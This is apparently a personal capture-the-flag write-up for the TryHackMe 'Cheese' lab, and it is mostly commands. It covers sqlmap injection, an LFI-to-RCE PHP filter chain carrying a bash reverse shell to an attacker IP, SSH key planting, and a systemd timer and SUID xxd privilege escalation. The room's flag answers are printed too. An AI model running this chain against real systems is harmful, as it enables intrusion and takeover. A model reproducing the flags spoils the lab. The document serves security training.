#cheese #thm #easy #LFI2RCE #ssh-keygen #SQLi #xxd #PHP-Filter-Chain

#### Ports
```
all ports are open
```

#### Directory Enumeration
```
nothing found
```

#### SQL
```
sqlmap -r req.txt -p username --dbs --batch
sqlmap -r req.txt -p username -D users --tables
sqlmap -r req.txt -p username -D users -T 
```
--> found this endpoint  : 
```
http://10.10.96.177/secret-script.php?file=supersecretadminpanel.html
```

```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```
-> unable to crack hash , but we don't need it also

#### LFI 

users in /etc/passwd : `comte`

#### Gaining Shell

--> **Got to know about PHP-Filter-Chaining thing to get RCE from LFI**
Link : https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md

-> ran : `python3 LFI2RCE.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.6.74.42/4444 0>&1\"'); ?>" | grep "^php" > payload.txt`

-> ran : `curl "http://10.10.221.128/secret-script.php?file=$(cat payload.txt)"`

##### Got Shell as www-data

#### Shell as Comte

-> Writeable perms on */home/comte/.ssh/authorized_keys*
-> `ssh-keygen -t rsa -f rghx -b 4096`
-> copied `rghx.pub` to */home/comte/.ssh/authorized_keys*
-> `chmod 600 rghx`
-> `ssh -i rghx comte@IP`

-> got shell as *COMTE*

###### user.txt : ***THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}***

#### Privilege Escalations

-> `sudo -l`
```
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

-> You have write privileges over */etc/systemd/system/exploit.timer*
-> added -> time 5s in file which was not mentioned
-> started service 
-> it was executing *exploit.service* file which copying *xxd* binary in /opt and giving it the SUID perms
-> `xdd` -> used to conver a file content into hex and also in original form again 

#### Gtfo xxd
```
LFILE=file_to_read
./xxd "$LFILE" | xxd -r
```

###### root.txt : ***THM{dca75486094810807faf4b7b0a929b11e5e0167c}
***

